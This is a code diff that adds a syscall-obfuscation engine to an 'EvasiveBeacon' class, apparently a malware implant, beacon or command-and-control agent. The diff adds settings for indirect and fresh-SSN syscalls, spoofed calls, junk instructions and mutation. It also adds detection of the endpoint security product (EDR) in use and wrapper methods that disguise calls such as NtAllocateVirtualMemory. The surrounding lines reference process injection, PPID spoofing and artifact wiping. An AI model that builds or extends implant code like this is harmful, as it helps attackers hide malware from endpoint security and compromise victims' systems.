@@ -76,6 +76,28 @@ except ImportError:
     InjectionTechnique = None
     print("[!] Process injection masterclass not available")
 
+# NEW: Import syscall obfuscation monster
+try:
+    from evasion.syscall_obfuscator import (
+        SyscallObfuscatorMonster,
+        AIObfuscationSelector,
+        GANStubMutator,
+        ObfuscationLayer,
+        EDRProfile as SyscallEDRProfile,
+        StubPattern,
+        SyscallObfuscationConfig,
+        create_obfuscator_monster,
+        quick_obfuscate_call,
+        get_ai_recommendation as get_syscall_recommendation,
+        detect_edr as detect_edr_for_syscall
+    )
+    SYSCALL_OBFUSCATOR_AVAILABLE = True
+except ImportError:
+    SYSCALL_OBFUSCATOR_AVAILABLE = False
+    SyscallObfuscatorMonster = None
+    ObfuscationLayer = None
+    print("[!] Syscall obfuscation monster not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -106,6 +128,14 @@ class BeaconConfig:
     enable_ppid_spoof: bool = True
     enable_mutation: bool = True
     injection_delay_ms: int = 2000
+    # NEW: Syscall obfuscation settings
+    enable_syscall_obfuscation: bool = True
+    syscall_obfuscation_layer: str = "full_monster"  # none, indirect_call, fresh_ssn, gan_mutate, full_monster
+    syscall_use_ml: bool = True
+    syscall_mutation_rate: float = 0.8
+    syscall_use_fresh_ssn: bool = True
+    syscall_enable_spoof: bool = True
+    syscall_junk_ratio: float = 0.5
 
 
 @dataclass
@@ -160,6 +190,11 @@ class EvasiveBeacon:
         self.injection_engine = None
         if INJECTION_AVAILABLE and config.enable_injection:
             self._init_injection()
+        
+        # NEW: Initialize syscall obfuscation engine
+        self.syscall_obfuscator = None
+        if SYSCALL_OBFUSCATOR_AVAILABLE and config.enable_syscall_obfuscation:
+            self._init_syscall_obfuscator()
         
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
@@ -275,6 +310,60 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize injection engine: {e}")
             self.injection_engine = None
+    
+    def _init_syscall_obfuscator(self):
+        """Initialize syscall obfuscation monster engine"""
+        if not SYSCALL_OBFUSCATOR_AVAILABLE:
+            return
+        
+        try:
+            # Parse layer
+            layer_map = {
+                'none': ObfuscationLayer.NONE,
+                'indirect_call': ObfuscationLayer.INDIRECT_CALL,
+                'fresh_ssn': ObfuscationLayer.FRESH_SSN,
+                'obfuscated_stub': ObfuscationLayer.OBFUSCATED_STUB,
+                'gan_mutate': ObfuscationLayer.GAN_MUTATE,
+                'entropy_heavy': ObfuscationLayer.ENTROPY_HEAVY,
+                'stub_swap': ObfuscationLayer.STUB_SWAP,
+                'full_monster': ObfuscationLayer.FULL_MONSTER,
+            }
+            
+            layer = layer_map.get(
+                self.config.syscall_obfuscation_layer.lower(),
+                ObfuscationLayer.FULL_MONSTER
+            )
+            
+            # Create config
+            syscall_config = SyscallObfuscationConfig(
+                ai_adaptive=True,  # Always use AI adaptive
+                use_ml_mutation=self.config.syscall_use_ml,
+                use_fresh_ntdll=self.config.syscall_use_fresh_ssn,
+                enable_spoof_calls=self.config.syscall_enable_spoof,
+                mutation_rate=self.config.syscall_mutation_rate,
+                junk_instruction_ratio=self.config.syscall_junk_ratio,
+            )
+            
+            # Create engine
+            self.syscall_obfuscator = SyscallObfuscatorMonster(syscall_config)
+            
+            # Get AI recommendation
+            selector = AIObfuscationSelector()
+            rec_layer, profile_info = selector.detect_and_select()
+            
+            profile = profile_info.get('profile', {})
+            
+            print(f"[+] Syscall obfuscator initialized: layer={layer.value}")
+            print(f"    AI recommended: {rec_layer.value}")
+            print(f"    Detected EDR: {profile.get('name', 'None')}")
+            print(f"    ML mutation: {self.config.syscall_use_ml}")
+            print(f"    Mutation rate: {self.config.syscall_mutation_rate}")
+            print(f"    Fresh SSN: {self.config.syscall_use_fresh_ssn}")
+            print(f"    Spoof calls: {self.config.syscall_enable_spoof}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize syscall obfuscator: {e}")
+            self.syscall_obfuscator = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -859,6 +948,116 @@ class EvasiveBeacon:
             "mutation_enabled": self.config.enable_mutation,
             "artifact_wipe_enabled": self.config.enable_artifact_wipe,
         }
+    
+    # =========================================================================
+    # SYSCALL OBFUSCATION
+    # =========================================================================
+    
+    def obfuscate_syscall(
+        self,
+        syscall_name: str,
+        args: Dict[str, Any] = None,
+        use_full_monster: bool = True
+    ) -> Dict[str, Any]:
+        """
+        Obfuscate a syscall using the monster engine.
+        
+        Args:
+            syscall_name: Name of syscall (e.g., "NtAllocateVirtualMemory")
+            args: Syscall arguments
+            use_full_monster: Apply full monster obfuscation
+        
+        Returns:
+            Dict with obfuscation result
+        """
+        if not self.syscall_obfuscator:
+            return {
+                "success": False,
+                "error": "Syscall obfuscator not available",
+                "syscall": syscall_name
+            }
+        
+        try:
+            result = self.syscall_obfuscator.obfuscate_call(
+                syscall_name=syscall_name,
+                args=args or {}
+            )
+            return {
+                "success": True,
+                "syscall": syscall_name,
+                "layers_applied": result.get("layers_applied", []),
+                "ssn": result.get("ssn"),
+                "stub_hash": result.get("stub_hash"),
+                "entropy": result.get("entropy"),
+                "mutation_generation": result.get("mutation_generation"),
+                "spoofed_calls": result.get("spoof_results", []),
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "syscall": syscall_name
+            }
+    
+    def obfuscate_syscall_sequence(
+        self,
+        syscalls: List[str],
+        args_list: List[Dict] = None,
+        reseed_after: int = 3
+    ) -> List[Dict[str, Any]]:
+        """
+        Obfuscate a sequence of syscalls with reseed between.
+        
+        Args:
+            syscalls: List of syscall names
+            args_list: List of args for each syscall
+            reseed_after: Reseed mutation engine after N calls
+        
+        Returns:
+            List of obfuscation results
+        """
+        if not self.syscall_obfuscator:
+            return [{"success": False, "error": "Obfuscator not available"}]
+        
+        results = []
+        args_list = args_list or [{}] * len(syscalls)
+        
+        for idx, (syscall, args) in enumerate(zip(syscalls, args_list)):
+            result = self.obfuscate_syscall(syscall, args)
+            results.append(result)
+            
+            # Reseed after N calls
+            if (idx + 1) % reseed_after == 0:
+                if hasattr(self.syscall_obfuscator, 'reseed_mutation'):
+                    self.syscall_obfuscator.reseed_mutation()
+        
+        return results
+    
+    def get_syscall_obfuscator_status(self) -> Dict[str, Any]:
+        """Get syscall obfuscator status"""
+        if not self.syscall_obfuscator:
+            return {"available": False, "reason": "Engine not initialized"}
+        
+        # Get AI recommendation
+        try:
+            selector = AIObfuscationSelector()
+            layer, profile = selector.detect_and_select()
+            
+            return {
+                "available": True,
+                "detected_edr": profile.get('profile', {}).get('name', 'None'),
+                "recommended_layer": layer.value,
+                "ml_mutation_enabled": self.config.syscall_use_ml,
+                "mutation_rate": self.config.syscall_mutation_rate,
+                "fresh_ssn_enabled": self.config.syscall_use_fresh_ssn,
+                "spoof_enabled": self.config.syscall_enable_spoof,
+                "junk_ratio": self.config.syscall_junk_ratio,
+            }
+        except Exception as e:
+            return {
+                "available": True,
+                "error": str(e),
+            }
     
     def _handle_exit(self, task: Dict) -> str:
         """Stop beacon"""
